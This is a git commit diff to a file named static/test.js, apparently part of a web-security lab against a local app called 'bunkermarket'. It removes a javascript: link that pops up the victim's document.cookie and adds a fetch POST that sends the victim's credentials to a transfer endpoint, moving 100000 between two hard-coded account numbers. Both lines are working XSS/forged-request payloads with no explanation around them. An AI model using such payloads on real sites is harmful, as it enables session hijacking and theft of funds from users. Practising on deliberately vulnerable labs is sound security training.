7edb46d90e79e090ece88a4b521d459f39c998ab
chrisjd20 <chrisjd20@gmail.com>
2025-05-05 14:56:17 -0400

    Update test.js

--- static/test.js
+++ static/test.js
@@ -1,1 +1,6 @@
-[a](javascript:prompt(document.cookie))
+fetch("http://localhost/bunkermarket/transfer", {
+  method: "POST",
+  credentials: "include",
+  headers: { "Content-Type": "application/x-www-form-urlencoded" },
+  body: "from_account=VT-7731-2277-0451&to_account=VT-1234-1234-1234&amount=100000"
+})
